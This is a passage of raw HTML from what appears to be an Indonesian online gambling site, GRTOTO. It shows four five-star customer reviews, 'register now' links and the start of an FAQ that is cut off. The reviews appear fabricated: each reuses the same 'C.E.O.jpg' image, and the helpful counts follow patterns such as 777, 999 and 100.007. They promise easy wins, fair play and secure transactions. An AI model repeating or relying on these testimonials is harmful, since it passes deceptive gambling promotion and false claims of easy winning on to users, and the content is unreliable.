                                                        d="M6.63257 10.25C7.43892 10.25 8.16648 9.80416 8.6641 9.16967C9.43726 8.18384 10.4117 7.3634 11.5255 6.77021C12.2477 6.38563 12.100.0073 5.81428 13.1781 5.05464C13.3908 4.5231 13.5 3.95587 13.5 3.38338V2.75C13.5 2.33579 13.8358 2 14.25 2C15.4926 2 16.5 3.00736 16.5 4.25C16.5 5.40163 16.2404 6.49263 15.7766 7.46771C15.511 8.02604 15.8836 8.75 16.5019 8.75M16.5019 8.75H19.6277C20.6544 8.75 21.5733 9.44399 21.682 10.4649C21.7269 10.8871 21.75 11.3158 21.75 11.75C21.75 14.5976 20.7581 17.2136 19.101 19.2712C18.7134 19.7525 18.1142 20 17.4962 20H13.4802C12.9966 20 12.5161 19.922 12.0572 19.7691L8.94278 18.7309C8.48393 18.578 8.00342 18.5 7.51975 18.5H5.90421M16.5019 8.75H14.25M5.90421 18.5C5.98702 18.7046 6.07713 18.9054 6.17423 19.1022C6.37137 19.5017 6.0962 20 5.65067 20H4.74289C3.85418 20 3.02991 19.482 2.77056 18.632C2.43208 17.5226 2.25 16.3451 2.25 15.125C2.25 13.5725 2.54481 12.0889 3.08149 10.7271C3.38655 9.95303 4.16733 9.5 4.99936 9.5H6.05212C6.52404 9.5 6.7973 10.0559 6.5523 10.4593C5.72588 11.8198 5.25 13.4168 5.25 15.125C5.25 16.3185 5.48232 17.4578 5.90421 18.5Z"
                                                        stroke="black" stroke-width="1.5" stroke-linecap="round"
                                                        stroke-linejoin="round"></path>
                                                </svg>
                                            </span>
                                            <span> Membantu (777) </span>
                                        </button>
                                    </div>
                                    <div class="flex justify-between gap-6 max-md:flex-col md:items-center"
                                        bis_skin_checked="1">
                                        <div class="grid gap-3" bis_skin_checked="1">
                                            <div class="grid gap-3" bis_skin_checked="1">
                                                <div class="flex justify-between" bis_skin_checked="1">
                                                    <div class="flex items-center gap-2" bis_skin_checked="1">
                                                        <div class="flex items-center gap-2" bis_skin_checked="1">
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                        </div>
                                                        <hr class="h-5 w-[0.5px] bg-bw-900">
                                                        <span class="text-sm text-bw-900">03 Januari 2026</span>
                                                    </div>
                                                </div>
                                                <div class="flex items-center gap-2" bis_skin_checked="1">
                                                    <div class="aspect-square size-8 cursor-pointer overflow-hidden rounded-full border"
                                                        bis_skin_checked="1">
                                                        <img src="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png"
                                                            alt="" width="32" height="32" class="rounded-full"
                                                            loading="lazy">
                                                    </div>
                                                    <span class="text-sm">vv************ti</span>
                                                </div>
                                                <span class="text-sm text-bw-900">Game: Toto</span>
                                                <div class="flex flex-wrap items-center gap-2" bis_skin_checked="1">
                                                    <span class="text-sm text-bw-900">Surabaya</span>
                                                </div>
                                                <p>Saya sudah coba banyak situs toto 4D, tapi GRTOTO paling konsisten soal kemenangan dan keamanan. Recommended banget.</p>
                                            </div>
                                            <div class="flex gap-4" bis_skin_checked="1">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                            </div>
                                        </div>
                                        <button class="flex items-center gap-1">
                                            <span class="nuxt-icon" style="display: none;"></span>
                                            <span class="nuxt-icon">
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M6.63257 10.25C7.43892 10.25 8.16648 9.80416 8.6641 9.16967C9.43726 8.18384 10.4117 7.3634 11.5255 6.77021C12.2477 6.38563 12.100.0073 5.81428 13.1781 5.05464C13.3908 4.5231 13.5 3.95587 13.5 3.38338V2.75C13.5 2.33579 13.8358 2 14.25 2C15.4926 2 16.5 3.00736 16.5 4.25C16.5 5.40163 16.2404 6.49263 15.7766 7.46771C15.511 8.02604 15.8836 8.75 16.5019 8.75M16.5019 8.75H19.6277C20.6544 8.75 21.5733 9.44399 21.682 10.4649C21.7269 10.8871 21.75 11.3158 21.75 11.75C21.75 14.5976 20.7581 17.2136 19.101 19.2712C18.7134 19.7525 18.1142 20 17.4962 20H13.4802C12.9966 20 12.5161 19.922 12.0572 19.7691L8.94278 18.7309C8.48393 18.578 8.00342 18.5 7.51975 18.5H5.90421M16.5019 8.75H14.25M5.90421 18.5C5.98702 18.7046 6.07713 18.9054 6.17423 19.1022C6.37137 19.5017 6.0962 20 5.65067 20H4.74289C3.85418 20 3.02991 19.482 2.77056 18.632C2.43208 17.5226 2.25 16.3451 2.25 15.125C2.25 13.5725 2.54481 12.0889 3.08149 10.7271C3.38655 9.95303 4.16733 9.5 4.99936 9.5H6.05212C6.52404 9.5 6.7973 10.0559 6.5523 10.4593C5.72588 11.8198 5.25 13.4168 5.25 15.125C5.25 16.3185 5.48232 17.4578 5.90421 18.5Z"
                                                        stroke="black" stroke-width="1.5" stroke-linecap="round"
                                                        stroke-linejoin="round"></path>
                                                </svg>
                                            </span>
                                            <span> Membantu (999) </span>
                                        </button>
                                    </div>
                                    <div class="flex justify-between gap-6 max-md:flex-col md:items-center"
                                        bis_skin_checked="1">
                                        <div class="grid gap-3" bis_skin_checked="1">
                                            <div class="grid gap-3" bis_skin_checked="1">
                                                <div class="flex justify-between" bis_skin_checked="1">
                                                    <div class="flex items-center gap-2" bis_skin_checked="1">
                                                        <div class="flex items-center gap-2" bis_skin_checked="1">
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                        </div>
                                                        <hr class="h-5 w-[0.5px] bg-bw-900">
                                                        <span class="text-sm text-bw-900">25 Desember 2025</span>
                                                    </div>
                                                </div>
                                                <div class="flex items-center gap-2" bis_skin_checked="1">
                                                    <div class="aspect-square size-8 cursor-pointer overflow-hidden rounded-full border"
                                                        bis_skin_checked="1">
                                                        <img src="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png"
                                                            alt="" width="32" height="32" class="rounded-full"
                                                            loading="lazy">
                                                    </div>
                                                    <span class="text-sm">gg************us</span>
                                                </div>
                                                <span class="text-sm text-bw-900">Game: Toto Togel</span>
                                                <div class="flex flex-wrap items-center gap-2" bis_skin_checked="1">
                                                    <span class="text-sm text-bw-900">Medan</span>
                                                </div>
                                                <p>Main di GRTOTO gampang menang, sistemnya fair play, dan pasaran slot & toto lengkap. Pasti balik lagi.</p>
                                            </div>
                                            <div class="flex gap-4" bis_skin_checked="1">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                            </div>
                                        </div>
                                        <button class="flex items-center gap-1">
                                            <span class="nuxt-icon" style="display: none;"></span>
                                            <span class="nuxt-icon">
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M6.63257 10.25C7.43892 10.25 8.16648 9.80416 8.6641 9.16967C9.43726 8.18384 10.4117 7.3634 11.5255 6.77021C12.2477 6.38563 12.100.0073 5.81428 13.1781 5.05464C13.3908 4.5231 13.5 3.95587 13.5 3.38338V2.75C13.5 2.33579 13.8358 2 14.25 2C15.4926 2 16.5 3.00736 16.5 4.25C16.5 5.40163 16.2404 6.49263 15.7766 7.46771C15.511 8.02604 15.8836 8.75 16.5019 8.75M16.5019 8.75H19.6277C20.6544 8.75 21.5733 9.44399 21.682 10.4649C21.7269 10.8871 21.75 11.3158 21.75 11.75C21.75 14.5976 20.7581 17.2136 19.101 19.2712C18.7134 19.7525 18.1142 20 17.4962 20H13.4802C12.9966 20 12.5161 19.922 12.0572 19.7691L8.94278 18.7309C8.48393 18.578 8.00342 18.5 7.51975 18.5H5.90421M16.5019 8.75H14.25M5.90421 18.5C5.98702 18.7046 6.07713 18.9054 6.17423 19.1022C6.37137 19.5017 6.0962 20 5.65067 20H4.74289C3.85418 20 3.02991 19.482 2.77056 18.632C2.43208 17.5226 2.25 16.3451 2.25 15.125C2.25 13.5725 2.54481 12.0889 3.08149 10.7271C3.38655 9.95303 4.16733 9.5 4.99936 9.5H6.05212C6.52404 9.5 6.7973 10.0559 6.5523 10.4593C5.72588 11.8198 5.25 13.4168 5.25 15.125C5.25 16.3185 5.48232 17.4578 5.90421 18.5Z"
                                                        stroke="black" stroke-width="1.5" stroke-linecap="round"
                                                        stroke-linejoin="round"></path>
                                                </svg>
                                            </span>
                                            <span> Membantu (100.007) </span>
                                        </button>
                                    </div>
                                    <div class="flex justify-between gap-6 max-md:flex-col md:items-center"
                                        bis_skin_checked="1">
                                        <div class="grid gap-3" bis_skin_checked="1">
                                            <div class="grid gap-3" bis_skin_checked="1">
                                                <div class="flex justify-between" bis_skin_checked="1">
                                                    <div class="flex items-center gap-2" bis_skin_checked="1">
                                                        <div class="flex items-center gap-2" bis_skin_checked="1">
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                        </div>
                                                        <hr class="h-5 w-[0.5px] bg-bw-900">
                                                        <span class="text-sm text-bw-900">13 Desember 2025</span>
                                                    </div>
                                                </div>
                                                <div class="flex items-center gap-2" bis_skin_checked="1">
                                                    <div class="aspect-square size-8 cursor-pointer overflow-hidden rounded-full border"
                                                        bis_skin_checked="1">
                                                        <img src="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png"
                                                            alt="" width="32" height="32" class="rounded-full"
                                                            loading="lazy">
                                                    </div>
                                                    <span class="text-sm">al************ky</span>
                                                </div>
                                                <span class="text-sm text-bw-900">Game: Link Toto</span>
                                                <div class="flex flex-wrap items-center gap-2" bis_skin_checked="1">
                                                    <span class="text-sm text-bw-900">Bandung</span>
                                                </div>
                                                <p>Sebagai pemain lama, saya merasa GRTOTO sangat terpercaya. Semua transaksi aman, dan update hasil cepat banget.</p>
                                            </div>
                                            <div class="flex gap-4" bis_skin_checked="1">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                            </div>
                                        </div>
                                        <button class="flex items-center gap-1">
                                            <span class="nuxt-icon" style="display: none;"></span>
                                            <span class="nuxt-icon">
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M6.63257 10.25C7.43892 10.25 8.16648 9.80416 8.6641 9.16967C9.43726 8.18384 10.4117 7.3634 11.5255 6.77021C12.2477 6.38563 12.100.0073 5.81428 13.1781 5.05464C13.3908 4.5231 13.5 3.95587 13.5 3.38338V2.75C13.5 2.33579 13.8358 2 14.25 2C15.4926 2 16.5 3.00736 16.5 4.25C16.5 5.40163 16.2404 6.49263 15.7766 7.46771C15.511 8.02604 15.8836 8.75 16.5019 8.75M16.5019 8.75H19.6277C20.6544 8.75 21.5733 9.44399 21.682 10.4649C21.7269 10.8871 21.75 11.3158 21.75 11.75C21.75 14.5976 20.7581 17.2136 19.101 19.2712C18.7134 19.7525 18.1142 20 17.4962 20H13.4802C12.9966 20 12.5161 19.922 12.0572 19.7691L8.94278 18.7309C8.48393 18.578 8.00342 18.5 7.51975 18.5H5.90421M16.5019 8.75H14.25M5.90421 18.5C5.98702 18.7046 6.07713 18.9054 6.17423 19.1022C6.37137 19.5017 6.0962 20 5.65067 20H4.74289C3.85418 20 3.02991 19.482 2.77056 18.632C2.43208 17.5226 2.25 16.3451 2.25 15.125C2.25 13.5725 2.54481 12.0889 3.08149 10.7271C3.38655 9.95303 4.16733 9.5 4.99936 9.5H6.05212C6.52404 9.5 6.7973 10.0559 6.5523 10.4593C5.72588 11.8198 5.25 13.4168 5.25 15.125C5.25 16.3185 5.48232 17.4578 5.90421 18.5Z"
                                                        stroke="black" stroke-width="1.5" stroke-linecap="round"
                                                        stroke-linejoin="round"></path>
                                                </svg>
                                            </span>
                                            <span> Membantu (555) </span>
                                        </button>
                                    </div>
                                    <div class="flex justify-between gap-6 max-md:flex-col md:items-center"
                                        bis_skin_checked="1">
                                        <div class="grid gap-3" bis_skin_checked="1">
                                            <div class="grid gap-3" bis_skin_checked="1">
                                                <div class="flex justify-between" bis_skin_checked="1">
                                                    <div class="flex items-center gap-2" bis_skin_checked="1">
                                                        <div class="flex items-center gap-2" bis_skin_checked="1">
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                            <button disabled="" class=""><span
                                                                    class="nuxt-icon star text-lg md:text-xl"><svg
                                                                        width="17" height="16" viewBox="0 0 17 16"
                                                                        fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path
                                                                            d="M8.50001 0.583252L10.9463 5.53909L16.4167 6.33867L12.4583 10.1941L13.3925 15.6408L8.50001 13.0678L3.60751 15.6408L4.54168 10.1941L0.583344 6.33867L6.05376 5.53909L8.50001 0.583252Z"
                                                                            fill="#FFD028" stroke="#E6B300"
                                                                            stroke-width="0.5" stroke-linecap="round"
                                                                            stroke-linejoin="round"></path>
                                                                    </svg></span></button>
                                                        </div>
                                                        <hr class="h-5 w-[0.5px] bg-bw-900">
                                                        <span class="text-sm text-bw-900">01 Desember 2025</span>
                                                    </div>
                                                </div>
                                                <div class="flex items-center gap-2" bis_skin_checked="1">
                                                    <div class="aspect-square size-8 cursor-pointer overflow-hidden rounded-full border"
                                                        bis_skin_checked="1">
                                                        <img src="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png"
                                                            alt="" width="32" height="32" class="rounded-full"
                                                            loading="lazy">
                                                    </div>
                                                    <span class="text-sm">fs************wi</span>
                                                </div>
                                                <span class="text-sm text-bw-900">Game: Situs toto</span>
                                                <div class="flex flex-wrap items-center gap-2" bis_skin_checked="1">
                                                    <span class="text-sm text-bw-900">Jakarta</span>
                                                </div>
                                                <p>GRTOTO membuat pengalaman bermain slot dan toto 4D makin seru. Bonus melimpah dan layanan CS siap membantu kapan saja.</p>
                                            </div>
                                            <div class="flex gap-4" bis_skin_checked="1">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                                <img src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="" width="80" height="80"
                                                    class="cursor-pointer rounded-xl object-cover object-center"
                                                    loading="lazy">
                                            </div>
                                        </div>
                                        <button class="flex items-center gap-1">
                                            <span class="nuxt-icon" style="display: none;"></span>
                                            <span class="nuxt-icon">
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
                                                    xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M6.63257 10.25C7.43892 10.25 8.16648 9.80416 8.6641 9.16967C9.43726 8.18384 10.4117 7.3634 11.5255 6.77021C12.2477 6.38563 12.100.0073 5.81428 13.1781 5.05464C13.3908 4.5231 13.5 3.95587 13.5 3.38338V2.75C13.5 2.33579 13.8358 2 14.25 2C15.4926 2 16.5 3.00736 16.5 4.25C16.5 5.40163 16.2404 6.49263 15.7766 7.46771C15.511 8.02604 15.8836 8.75 16.5019 8.75M16.5019 8.75H19.6277C20.6544 8.75 21.5733 9.44399 21.682 10.4649C21.7269 10.8871 21.75 11.3158 21.75 11.75C21.75 14.5976 20.7581 17.2136 19.101 19.2712C18.7134 19.7525 18.1142 20 17.4962 20H13.4802C12.9966 20 12.5161 19.922 12.0572 19.7691L8.94278 18.7309C8.48393 18.578 8.00342 18.5 7.51975 18.5H5.90421M16.5019 8.75H14.25M5.90421 18.5C5.98702 18.7046 6.07713 18.9054 6.17423 19.1022C6.37137 19.5017 6.0962 20 5.65067 20H4.74289C3.85418 20 3.02991 19.482 2.77056 18.632C2.43208 17.5226 2.25 16.3451 2.25 15.125C2.25 13.5725 2.54481 12.0889 3.08149 10.7271C3.38655 9.95303 4.16733 9.5 4.99936 9.5H6.05212C6.52404 9.5 6.7973 10.0559 6.5523 10.4593C5.72588 11.8198 5.25 13.4168 5.25 15.125C5.25 16.3185 5.48232 17.4578 5.90421 18.5Z"
                                                        stroke="black" stroke-width="1.5" stroke-linecap="round"
                                                        stroke-linejoin="round"></path>
                                                </svg>
                                            </span>
                                            <span> Membantu (444) </span>
                                        </button>
                                    </div>
                                    <!---->
                                    <hr class="border-bw-100">
                                </div><a href="https://otiumpro.com/clientes/"
                                    class="btn btn-primary mr-auto !px-12 text-sm">Lihat Semua</a>
                                <!---->
                            </section>

                            <div class="relative max-md:hidden" bis_skin_checked="1"><img src="/asset/discount.webp"
                                    alt="" class="w-full" loading="lazy">
                                <p
                                    class="absolute left-1/2 top-[60%] z-[1] -translate-x-1/2 -translate-y-1/2 text-balance text-center text-2xl text-white">
                                    Dapatkan <b class="text-4xl">Promo &amp; Pelayanan</b> Spesial <b
                                        class="text-4xl">Situs Toto Online Top 1</b></p><a
                                    href="https://otiumpro.com/clientes/"><button
                                        class="btn absolute right-5 top-[60%] -translate-y-1/2 bg-blue-100 text-primary">
                                        Daftar Sekarang
                                    </button></a>
                            </div>
                            <div class="faq-section">
    <h2>FAQ RESMI SEPUTAR PEMAIN GRTOTO</h2>
    <div class="faq-container">

        <div class="faq-item">
            <button class="faq-question">
